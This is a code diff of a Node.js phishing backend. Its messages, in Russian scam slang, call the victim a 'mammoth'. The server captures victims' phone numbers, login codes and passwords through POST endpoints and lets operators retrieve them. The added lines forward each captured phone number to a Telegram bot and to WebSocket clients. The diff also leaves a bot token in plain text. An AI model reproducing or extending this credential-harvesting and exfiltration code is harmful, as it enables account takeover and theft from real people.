@@ -1,21 +1,14 @@
+const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const app = express();
 const port = 3000;
 const cors = require('cors');
+const WebSocket = require('ws');
+const bot = new TelegramBot(token, { polling: true }); 
 
-// app.use((req, res, next) => {
-    //     res.header('Access-Control-Allow-Origin', '*');
-    //     res.header('Access-Control-Allow-Credentials', true);
-//     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+//6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI
 
-//     if (req.method === 'OPTIONS') {
-//       res.sendStatus(200);
-//     } else {
-//       next();
-//     }
-//   });
-
+const wss = new WebSocket.Server({ port: 8080 });
 
 app.use(express.json());
 
@@ -30,21 +23,41 @@ app.use(cors({
 var pn;
 var code;
 var pass;
+
+wss.on('connection', function connection(ws) {
+    console.log('Новое подключение');
+});
+
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
+        
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(JSON.stringify({ phoneNumber: phone_number }));
+            }
+        });
+        
+        const chatId = '6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI';
+        bot.sendMessage(chatId, `Номер телефона мамонта: ${phone_number}`)
+            .then(() => {
+                console.log('Сообщение успешно отправлено в телеграм.');
+            })
+            .catch((error) => {
+                console.error('Ошибка при отправке сообщения в телеграм:', error);
+            });
+
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
-        return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
         res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
-        return;
     }
 });
+
 app.get('/getPhone', (req, res) => {
-    if(pn){
+    if (pn) {
         res.send(`Номер телефона мамонта: \n ${pn}`);
         pn = undefined;
         return 0;
@@ -69,7 +82,7 @@ app.post('/authCode', (req, res) => {
 });
 
 app.get('/getCode', (req, res) => {
-    if(code){
+    if (code) {
         res.send(`Код мамонта:\n${code}`);
         code = undefined;
         return 0;
@@ -94,7 +107,7 @@ app.post('/password', (req, res) => {
 });
 
 app.get('/getPassword', (req, res) => {
-    if(pass){
+    if (pass) {
         res.send(`Пароль мамонта: \n ${pass}`);
         pass = undefined;
         return;
